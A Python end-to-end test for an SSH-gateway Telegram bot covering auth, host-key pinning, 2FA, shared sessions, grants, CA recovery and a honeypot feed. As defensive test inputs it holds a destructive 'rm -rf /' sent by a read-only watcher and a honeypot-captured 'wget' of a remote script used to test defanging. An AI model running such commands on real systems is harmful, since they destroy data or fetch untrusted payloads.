"""NULLBYTE Ops end-to-end: a real asyncssh server trusting the CA, the real aiohttp gateway over WebSocket,
and the bot handlers through a mock Bot API."""
import asyncio, json, os, re, sys, tempfile, time

HERE = os.path.dirname(__file__)
TMP = tempfile.mkdtemp()
os.environ.update(BOT_TOKEN="123:TEST", OWNER_ID="1001", DATA_DIR=TMP, HONEYPOT_ENABLED="0",
                  WEBAPP_URL="https://ops.example.test", WEBAPP_PORT="0", HP_STREAM_CHAT="-100777", OPS_HEALTH_MIN="60")
sys.path.insert(0, os.path.dirname(HERE))

import aiohttp
import asyncssh
from telegram import Update
from telegram.request import BaseRequest

from nullbyte import bot as B
from pathlib import Path

# CFG is module-level and shared with the other test files: override for this test only, then restore
OVERRIDES = dict(webapp_url="https://ops.example.test", webapp_port=0, hp_stream_chat="-100777", honeypot_enabled=False,
                 ops_health_min=60, data_dir=Path(TMP), owner_id=1001, token="123:TEST")
from nullbyte.ops import tgauth
from nullbyte.ops.record import cast_to_gif

OWNER, FRIEND = 1001, 2002
SENT: list[dict] = []
TOKEN = "123:TEST"


class FakeAPI(BaseRequest):
    mid = 1000
    async def initialize(self): pass
    async def shutdown(self): pass
    async def do_request(self, url, method, request_data=None, **kw):
        ep = url.rsplit("/", 1)[-1]
        p = dict(request_data.parameters) if request_data else {}
        files = dict(request_data.multipart_data or {}) if request_data else {}
        SENT.append({"method": ep, "params": p, "files": files})
        if ep == "getMe":
            r = {"id": 999, "is_bot": True, "first_name": "NULLBYTE", "username": "nullbyte_bot"}
        elif ep in ("sendMessage", "editMessageText", "sendDocument", "sendPhoto", "sendAnimation"):
            FakeAPI.mid += 1
            cid = int(p.get("chat_id", OWNER))
            r = {"message_id": int(p.get("message_id", FakeAPI.mid)), "date": int(time.time()),
                 "chat": {"id": cid, "type": "private" if cid > 0 else "channel"}}
            if "text" in p:
                r["text"] = p["text"]
        else:
            r = True
        return 200, json.dumps({"ok": True, "result": r}).encode()


UID = [0]
def upd(user=OWNER, text=None, cb=None):
    UID[0] += 1
    frm = {"id": user, "is_bot": False, "first_name": {OWNER: "Matin", FRIEND: "Ali"}[user],
           **({"username": "ali_h4x"} if user == FRIEND else {})}
    ch = {"id": user, "type": "private"}
    if cb:
        return {"update_id": UID[0], "callback_query": {"id": str(UID[0]), "from": frm, "chat_instance": "x", "data": cb,
                "message": {"message_id": 1, "date": int(time.time()), "chat": ch, "text": "x"}}}
    m = {"message_id": 5000 + UID[0], "date": int(time.time()), "chat": ch, "from": frm, "text": text}
    if text.startswith("/"):
        m["entities"] = [{"type": "bot_command", "offset": 0, "length": len(text.split()[0])}]
    return {"update_id": UID[0], "message": m}


strip = lambda t: re.sub(r"<[^>]+>", "", t or "")
def since(n, method=None, chat=None):
    return [s for s in SENT[n:] if (not method or s["method"] == method)
            and (chat is None or str(s["params"].get("chat_id")) == str(chat))]
def txt(s): return s["params"].get("text") or s["params"].get("caption") or ""
def alltext(n): return "\n".join(strip(txt(s)) for s in SENT[n:])
def init_data(uid, name):
    return tgauth.sign({"auth_date": str(int(time.time())), "query_id": "AAA",
                        "user": json.dumps({"id": uid, "first_name": name, "username": name.lower()})}, TOKEN)


async def ssh_server(ca_line: str):
    """A real SSH server: trusts the NULLBYTE CA for principals 'matin' and 'deploy', also accepts a password."""
    hk = asyncssh.generate_private_key("ssh-ed25519")
    auth = asyncssh.import_authorized_keys(f'cert-authority,principals="matin,deploy" {ca_line}\n')

    async def handle(p):
        if p.command:
            cmd = p.command
            if "proc/loadavg" in cmd:
                p.stdout.write("0.42 0.30 0.20 1/100 999\n4\n38.5\n95\n86400\n")     # disk 95% -> alert
            else:
                p.stdout.write(f"ran:{cmd}\nFilesystem Size Used\n/dev/sda1 50G 47G\n")
            p.exit(0)
            return
        p.stdout.write(f"welcome {p.get_extra_info('username')}\r\n$ ")
        async for line in p.stdin:
            p.stdout.write(f"echo:{line.strip()}\r\n$ ")

    class S(asyncssh.SSHServer):
        def password_auth_supported(self): return True
        def validate_password(self, u, pw): return pw == "hunter2"

    srv = await asyncssh.create_server(S, "127.0.0.1", 0, server_host_keys=[hk], authorized_client_keys=auth,
                                       process_factory=handle)
    return srv, srv.sockets[0].getsockname()[1], hk.get_fingerprint("sha256")


async def ws_recv_until(ws, pred, timeout=10):
    seen = []
    end = time.time() + timeout
    while time.time() < end:
        msg = await asyncio.wait_for(ws.receive(), timeout=end - time.time())
        if msg.type != aiohttp.WSMsgType.TEXT:
            raise AssertionError(f"ws closed: {msg}")
        m = json.loads(msg.data)
        seen.append(m)
        if pred(m):
            return m, seen
    raise AssertionError(f"timeout; saw {seen[-5:]}")


def test_ops_end_to_end():
    saved = {k: getattr(B.CFG, k) for k in OVERRIDES}
    for k, v in OVERRIDES.items():
        setattr(B.CFG, k, v)
    try:
        asyncio.run(_run())
    finally:
        for k, v in saved.items():
            setattr(B.CFG, k, v)


async def _run():
    app = B.Application.builder().token(TOKEN).request(FakeAPI()).get_updates_request(FakeAPI()) \
        .defaults(B.Defaults(parse_mode=B.ParseMode.HTML)).build()
    real = B.build_app()
    ops = real.bot_data["ops"]
    ops.app = app
    app.bot_data["ops"] = ops
    for g, hs in real.handlers.items():
        for h in hs:
            app.add_handler(h, g)
    app.add_error_handler(B.on_error)
    await app.initialize()
    await B.post_init(app)
    go = lambda d: app.process_update(Update.de_json(d, app.bot))
    port_web = ops.web.runner.addresses[0][1]
    base = f"http://127.0.0.1:{port_web}"
    srv, sport, sfp = await ssh_server(ops.ca.public_line)

    # auto-approve 2FA from the "bot" side: watch for the approval message and tap the button
    async def tapper():
        handled = set()
        while True:
            await asyncio.sleep(0.05)
            for i, s in enumerate(SENT):
                if i in handled:
                    continue
                kb = json.dumps(s["params"].get("reply_markup", ""))
                m = re.search(r'ops2fa:([0-9a-f]+):trust', kb)
                if m:
                    handled.add(i)
                    who = int(s["params"]["chat_id"])
                    await go(upd(user=who, cb=f"ops2fa:{m.group(1)}:{'deny' if who == 4242 else 'trust'}"))
    tap = asyncio.create_task(tapper())

    async with aiohttp.ClientSession() as http:
        # Mini App page + vendored xterm are served with a CSP
        r = await http.get(base + "/")
        assert r.status == 200 and "xterm" in await r.text() and "Content-Security-Policy" in r.headers
        assert (await http.get(base + "/vendor/xterm.js")).status == 200

        # forged initData is rejected
        ws = await http.ws_connect(base + "/ws?tg=" + "user%3D%7B%22id%22%3A1001%7D%26hash%3Dbad")
        m, _ = await ws_recv_until(ws, lambda m: m["t"] == "error")
        assert m["code"] == "auth"
        await ws.close()

        # operator: hello -> probe -> open (CA, keyless) -> 2FA -> shell
        ws = await http.ws_connect(base + "/ws?tg=" + aiohttp.helpers.quote(init_data(OWNER, "Matin"), safe=""))
        await ws.send_json({"t": "hello"})
        hi, _ = await ws_recv_until(ws, lambda m: m["t"] == "hi")
        assert hi["role"] == "operator"
        await ws.send_json({"t": "probe", "host": "127.0.0.1", "port": sport})
        fp, _ = await ws_recv_until(ws, lambda m: m["t"] == "fp")
        assert fp["fp"] == sfp

        # wrong pin -> refused before auth (2FA approval comes first, and trusts this device for 12h)
        n2fa = len(SENT)
        await ws.send_json({"t": "open", "target": {"host": "127.0.0.1", "port": sport, "user": "matin", "auth": "password",
                                                    "password": "hunter2", "fp": "SHA256:evil"}, "cols": 80, "rows": 24, "device": "dev1"})
        m, _ = await ws_recv_until(ws, lambda m: m["t"] == "error")
        assert m["code"] == "hostkey" and m["seen"] == sfp, m

        n = len(SENT)
        await ws.send_json({"t": "open", "target": {"name": "lab", "host": "127.0.0.1", "port": sport, "user": "matin",
                                                    "auth": "ca", "fp": sfp}, "cols": 80, "rows": 24, "device": "dev1"})
        opened, seen = await ws_recv_until(ws, lambda m: m["t"] in ("opened", "error"))
        assert opened["t"] == "opened", opened
        assert "LOGIN APPROVAL" in alltext(n2fa) and "LOGIN APPROVAL" not in alltext(n), "trusted device: no 2nd prompt"
        out, _ = await ws_recv_until(ws, lambda m: m["t"] == "o" and "welcome matin" in m["d"])
        await ws.send_json({"t": "i", "d": "ls -la\r"})
        await ws_recv_until(ws, lambda m: m["t"] == "o" and "echo:ls -la" in m["d"])

        # share read-only -> friend watches
        await ws.send_json({"t": "share"})
        sh, _ = await ws_recv_until(ws, lambda m: m["t"] == "shared")
        tok = sh["link"].split("start=w_")[1]
        ws2 = await http.ws_connect(base + "/ws?tg=" + aiohttp.helpers.quote(init_data(FRIEND, "Ali"), safe=""))
        await ws2.send_json({"t": "watch", "token": tok})
        await ws_recv_until(ws2, lambda m: m["t"] == "watching")
        await ws2.send_json({"t": "i", "d": "rm -rf /\r"})          # watchers can't type
        await ws.send_json({"t": "i", "d": "whoami\r"})
        await ws_recv_until(ws2, lambda m: m["t"] == "o" and "echo:whoami" in m["d"])
        await asyncio.sleep(0.2)
        sess = next(iter(ops.gw.sessions.values()))
        assert "rm -rf" not in "".join(sess.scrollback)
        await ws.send_json({"t": "close"})
        await ws_recv_until(ws, lambda m: m["t"] == "exit")
        await ws2.close()

        # guest can't open arbitrary hosts
        ws3 = await http.ws_connect(base + "/ws?tg=" + aiohttp.helpers.quote(init_data(FRIEND, "Ali"), safe=""))
        await ws3.send_json({"t": "hello"})
        hi3, _ = await ws_recv_until(ws3, lambda m: m["t"] == "hi")
        assert hi3["role"] == "guest" and hi3["grants"] == []
        await ws3.send_json({"t": "open", "target": {"host": "10.0.0.1", "user": "root", "auth": "password"}, "cols": 80, "rows": 24})
        m, _ = await ws_recv_until(ws3, lambda m: m["t"] == "error")
        assert m["code"] == "perm"

        # enroll server for monitoring (non-secret metadata only)
        await ws.send_json({"t": "enroll", "name": "lab", "host": "127.0.0.1", "port": sport, "user": "matin", "fp": sfp})
        en, _ = await ws_recv_until(ws, lambda m: m["t"] == "enrolled")

    # recording -> GIF
    sess_row = ops.store.sessions(OWNER, 5)[0]
    assert sess_row["cast"] and os.path.exists(sess_row["cast"])
    gif = cast_to_gif(sess_row["cast"], title="lab")
    assert gif[:6] == b"GIF89a"

    # ---------------- bot side
    n = len(SENT); await go(upd(text="/fx_ca"))
    assert "TrustedUserCAKeys" in alltext(n)
    n = len(SENT); await go(upd(text="/efferent"))
    t = alltext(n); assert "EFFERENT-008 // FLEET" in t and "lab" in t
    assert "web_app" in json.dumps(since(n, "sendMessage")[0]["params"].get("reply_markup", ""))

    # runbook over a force-command cert
    n = len(SENT); await go(upd(text="/fx_signal lab disk"))
    assert "ran:df -h" in alltext(n), alltext(n)
    # confirm-gated runbook asks first
    sid = en["id"]
    n = len(SENT); await go(upd(cb=f"ops:go:{sid}:nginx"))
    assert "run on lab?" in alltext(n) and "ran:" not in alltext(n)

    # health job -> disk 95% -> alert with chart
    n = len(SENT); await ops.job_health(None)
    photos = since(n, "sendPhoto", OWNER)
    assert photos and "disk 95%" in strip(txt(photos[0])), alltext(n)
    n = len(SENT); await ops.job_health(None)
    assert not since(n, "sendPhoto"), "same state must not re-alert"

    # grant: 30m for deploy, friend claims, connects through gateway with CA cert as 'deploy'
    n = len(SENT); await go(upd(text="/fx_grant lab 30m user=deploy"))
    link = re.search(r"start=g_([\w-]+)", alltext(n)).group(1)
    n = len(SENT); await go(upd(user=FRIEND, text=f"/start g_{link}"))
    assert "ACCESS GRANTED" in alltext(n) and "claimed grant" in alltext(n)
    n = len(SENT); await go(upd(user=FRIEND, text=f"/start g_{link}x"))
    assert "expired, revoked" in alltext(n)
    async with aiohttp.ClientSession() as http:
        ws = await http.ws_connect(base + "/ws?tg=" + aiohttp.helpers.quote(init_data(FRIEND, "Ali"), safe=""))
        await ws.send_json({"t": "hello"})
        hi, _ = await ws_recv_until(ws, lambda m: m["t"] == "hi")
        assert len(hi["grants"]) == 1
        await ws.send_json({"t": "open", "grant": hi["grants"][0]["id"], "cols": 80, "rows": 24, "device": "ali-phone"})
        opened, _ = await ws_recv_until(ws, lambda m: m["t"] in ("opened", "error"))
        assert opened["t"] == "opened" and opened["expires"], opened
        await ws_recv_until(ws, lambda m: m["t"] == "o" and "welcome deploy" in m["d"])
        # owner revokes -> session closes
        gid = hi["grants"][0]["id"]
        await go(upd(cb=f"ops:rv:{gid}"))
        await ws_recv_until(ws, lambda m: m["t"] == "exit")
    # bring-your-own-key cert (after revoke: refused)
    k = asyncssh.generate_private_key("ssh-ed25519").export_public_key().decode().strip()
    n = len(SENT); await go(upd(user=FRIEND, text=f"/fx_cert {gid} {k}"))
    assert "no such active grant" in alltext(n)
    n = len(SENT); await go(upd(text="/fx_grant lab 2h"))
    link = re.search(r"start=g_([\w-]+)", alltext(n)).group(1)
    await go(upd(user=FRIEND, text=f"/start g_{link}"))
    g2 = ops.store.grants_for(FRIEND)[0]
    n = len(SENT); await go(upd(user=FRIEND, text=f"/fx_cert {g2['id']} {k}"))
    doc = since(n, "sendDocument")[0]
    cert_bytes = doc["files"]["document"][1]
    assert b"ssh-ed25519-cert-v01@openssh.com" in cert_bytes
    cert = asyncssh.import_certificate(cert_bytes)
    assert cert.principals == ["matin"] and 0 < cert._valid_before - time.time() < 2 * 3600 + 5

    # connection card: secret-free, deep link opens a card for anyone
    n = len(SENT); await go(upd(cb=f"ops:cd:{sid}"))
    cid = re.search(r"start=c_([\w-]+)", alltext(n)).group(1)
    n = len(SENT); await go(upd(user=FRIEND, text=f"/start c_{cid}"))
    t = alltext(n); assert "CONNECTION CARD" in t and sfp[:20] in t and "hunter2" not in t
    assert "card=" in json.dumps(since(n, "sendMessage")[0]["params"]["reply_markup"])

    # break-glass: split CA 2-of-3, destroy, recover from 2 shares -> same CA fingerprint
    fp_before = ops.ca.fingerprint
    n = len(SENT); await go(upd(text="/fx_breakglass 2 3"))
    shares = re.findall(r"sss1-[0-9a-f]{6}-\d+-\d+-[a-z2-7]+-[0-9a-f]{4}", alltext(n))
    assert len(shares) == 3
    n = len(SENT); await go(upd(text=f"/fx_recover {shares[0]} {shares[2]}"))
    assert "CA restored" in alltext(n) and ops.ca.fingerprint == fp_before
    n = len(SENT); await go(upd(user=FRIEND, text="/fx_breakglass 2 3"))
    assert "owner only" in alltext(n)

    # honeypot -> channel stream (masked IP, defanged URL)
    await go(upd(text="/hp_stream on"))
    ops.hp_push({"ip": "203.0.113.77", "geo": {"countryCode": "NL"}}, "wget http://198.51.100.7/x.sh")
    n = len(SENT); await ops.job_hp_stream(None)
    t = alltext(n)
    assert "203.0.113.x" in t and "hxxp://" in t and "198.51.100[.]7" in t and since(n, chat="-100777")

    # audit + recordings
    n = len(SENT); await go(upd(text="/fx_audit"))
    t = alltext(n); assert "connect" in t and "grant-revoke" in t and "breakglass" in t
    n = len(SENT); await go(upd(text="/fx_sessions"))
    assert "RECORDINGS" in alltext(n)
    n = len(SENT); await go(upd(cb=f"ops:gif:{sess_row['id']}"))
    assert since(n, "sendAnimation")

    # non-operators can't use operator commands
    n = len(SENT); await go(upd(user=FRIEND, text="/fx_grant lab 1h"))
    assert "operators" in alltext(n)

    tap.cancel()
    srv.close()
    await ops.stop()
